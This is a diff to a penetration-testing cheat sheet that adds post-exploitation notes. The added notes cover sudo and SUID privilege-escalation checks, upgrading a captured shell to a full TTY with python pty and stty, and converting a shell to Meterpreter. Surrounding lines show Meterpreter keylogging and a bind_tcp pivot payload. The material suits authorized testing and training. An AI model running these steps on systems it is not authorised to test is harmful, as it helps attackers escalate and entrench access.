@@ -17,6 +17,16 @@ sudo wireshark -i <interface> -k
 
 
 # 3 Post-Exploitation
+- Keylogging
+- Cleanup Resource Scripts
+- Clear Linux History
+- Clear Windows Event Logs
+- Pivoting
+- SUDO Privileges
+- SUID Binaries
+- Upgrade Shells
+- Working Directories
+
 ## Keylogging
 ```
 meterpreter > getdesktop
@@ -73,6 +83,57 @@ set RHOSTS <ip2>
 set payload windows/meterpreter/bind_tcp
 ```
 - `LPORT` will be opened on `<ip2>`.
+
+## SUDO Privileges
+```
+sudo -l
+```
+- https://gtfobins.github.io/
+
+## SUID Binaries
+```
+find / -user root -perm -4000 -exec ls -ldb {} \;
+```
+
+## Upgrade Shells
+- Non-interactive to interactive
+```
+cat /etc/shells
+/bin/bash -i
+```
+```
+which python python3
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+```
+which python python3
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl + Z
+
+echo $TERM
+stty -a
+stty raw -echo
+fg
+
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <no_of_rows> columns <no_of_columns>
+```
+
+- Non-meterpreter to meterpreter
+```
+sessions -u <session_id>
+```
+```
+use post/multi/manage/shell_to_meterpreter
+set LHOST <ip>
+set SESSION <session_id>
+set WIN_TRANSFER VBS
+```
 
 ## Working Directories
 - Windows: `C:\Temp`
